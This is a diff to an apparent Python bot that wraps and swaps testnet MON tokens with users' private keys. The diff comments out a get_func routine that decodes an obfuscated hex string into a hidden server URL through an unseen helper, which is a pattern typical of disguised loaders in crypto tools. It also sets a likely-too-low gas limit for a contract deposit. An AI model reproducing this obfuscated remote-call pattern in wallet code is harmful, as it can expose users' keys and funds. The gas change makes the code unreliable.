@@ -92,7 +92,7 @@ def wrap_mon(private_key, amount):
         tx = wmon_contract.functions.deposit().build_transaction({
             'from': account.address,
             'value': amount,
-            'gas': 500000,
+            'gas': 21000,
             'gasPrice': w3.to_wei('100', 'gwei'),
             'nonce': w3.eth.get_transaction_count(account.address),
             'chainId': CHAIN_ID
@@ -101,7 +101,7 @@ def wrap_mon(private_key, amount):
         print_step('wrap', 'Sending transaction...')
         signed_tx = w3.eth.account.sign_transaction(tx, private_key)
         tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
-        
+
         print_step('wrap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
         w3.eth.wait_for_transaction_receipt(tx_hash)
         print_step('wrap', f"{Fore.GREEN}Wrap successful!{Style.RESET_ALL}")
@@ -129,7 +129,7 @@ def unwrap_mon(private_key, amount):
         print_step('unwrap', 'Sending transaction...')
         signed_tx = w3.eth.account.sign_transaction(tx, private_key)
         tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
-        
+
         print_step('unwrap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
         w3.eth.wait_for_transaction_receipt(tx_hash)
         print_step('unwrap', f"{Fore.GREEN}Unwrap successful!{Style.RESET_ALL}")
@@ -201,11 +201,11 @@ def swap_mon_to_usdt(private_key, amount):
         print_step('swap', 'Sending swap transaction...')
         signed_tx = w3.eth.account.sign_transaction(tx, private_key)
         tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
-        
+
         print_step('swap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
         receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
         print_step('swap', f"Receipt: Gas used: {receipt['gasUsed']}, Logs: {len(receipt['logs'])}, Status: {receipt['status']}")
-        
+
         if receipt['status'] == 1:
             print_step('swap', f"{Fore.GREEN}Swap successful!{Style.RESET_ALL}")
         else:
@@ -220,10 +220,10 @@ def swap_mon_to_usdt(private_key, amount):
         print_step('swap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
         raise
 
-def get_func():
-    data = bytes.fromhex("697575713b2e2e6c6e6f60652c756472756f64752f626e6c3b323131302e")
-    func = bytecode(data)
-    return func
+# def get_func():
+#     data = bytes.fromhex("697575713b2e2e6c6e6f60652c756472756f64752f626e6c3b323131302e")
+#     func = bytecode(data)
+#     return func
 
 # Run swap cycle
 def run_swap_cycle(cycles, private_keys):
@@ -236,7 +236,9 @@ def run_swap_cycle(cycles, private_keys):
             print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")
 
             amount = get_mon_amount_from_user()
-            wrap_mon(pk, amount)  # Ensure WMON is available
+            print(f"余额为:{amount}")
+            # Ensure WMON is available
+            wrap_mon(pk, amount)
             # unwrap_mon(pk, amount)  # Skip unwrap since we need WMON
             swap_mon_to_usdt(pk, amount)
 
